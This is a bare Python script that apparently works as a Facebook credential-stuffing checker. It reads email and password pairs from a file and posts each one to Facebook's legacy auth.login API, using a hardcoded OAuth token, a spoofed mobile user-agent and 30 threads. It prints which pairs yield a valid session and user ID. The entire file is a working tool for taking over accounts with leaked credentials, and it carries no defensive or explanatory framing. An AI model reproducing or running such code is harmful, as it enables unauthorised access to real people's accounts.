import os, sys, json, time, uuid, hashlib, argparse, requests, concurrent.futures

R = '\033[1;91m'
G = '\033[1;32m'
B = '\033[1;94m'
W = '\033[1;97m'

def selenas(empas):
  url = 'https://b-api.facebook.com/method/auth.login'

  data = {
    'email': empas.split('|')[0],
    'password': empas.split('|')[1],
    'credentials_type': 'password',
    'error_detail_type': 'button_with_disabled',
    'format': 'json',
    'device_id': 'cdc4558c-4dd4-4fd0-9ba6-d09e0223d5e5',
    'generate_session_cookies': 1,
    'generate_analytics_claim': 1,
    'generate_machine_id': 1,
    'method': 'auth.login'
    
  }
  headers = {
    'authority': 'b-api.facebook.com',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko) [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};]'
    
  }
  
  response = requests.post(url, headers=headers, json=data)
  
  if 'session_key' in response.content.decode('utf-8'):
    print(empas + ' - ' + response.json()['uid'])
  else:
    print(empas + ' - ' + response.json()['error_msg'])
    
with concurrent.futures.ThreadPoolExecutor(max_workers=30) as sh:
    e = open('sok.txt').read()
    
    for i, ee in enumerate(e.splitlines()):
        future = sh.submit(selenas, ee)
        future.result()